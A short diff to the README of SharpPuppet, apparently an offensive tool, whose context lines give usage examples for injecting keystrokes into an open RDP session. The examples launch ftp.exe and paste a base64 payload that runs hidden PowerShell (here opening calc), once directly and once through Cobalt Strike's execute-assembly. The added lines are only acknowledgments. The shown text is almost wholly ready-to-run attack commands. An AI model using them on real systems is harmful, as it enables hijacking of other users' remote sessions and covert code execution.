@@ -37,3 +37,6 @@ SharpPuppet comes with some situational awareness built in. For instance, using 
 ### Popping Calc on open RDP session
 * .\SharpPuppet.exe mstsc 'FULL\~\~DELAY 100\~\~GUI r\~\~DELAY 100\~\~STRING ftp.exe\~\~DELAY 100\~\~ENTER\~\~DELAY 500\~\~PASTEPAYLOAD\~\~DELAY 200\~\~MIN' 'IXBvd2Vyc2hlbGwuZXhlIC13IGhpZGRlbiAtbm9wIC1jIGNhbGMuZXhl'
 * FROM COBALT-STRIKE: execute-assembly \<path\>/SharpPuppet.exe mstsc 'FULL\~\~DELAY 100\~\~GUI r\~\~DELAY 100\~\~STRING ftp.exe\~\~DELAY 100\~\~ENTER\~\~DELAY 500\~\~PASTEPAYLOAD\~\~DELAY 200\~\~MIN' 'IXBvd2Vyc2hlbGwuZXhlIC13IGhpZGRlbiAtbm9wIC1jIGNhbGMuZXhl'
+
+## Acknowledgments
+@Th3M00se
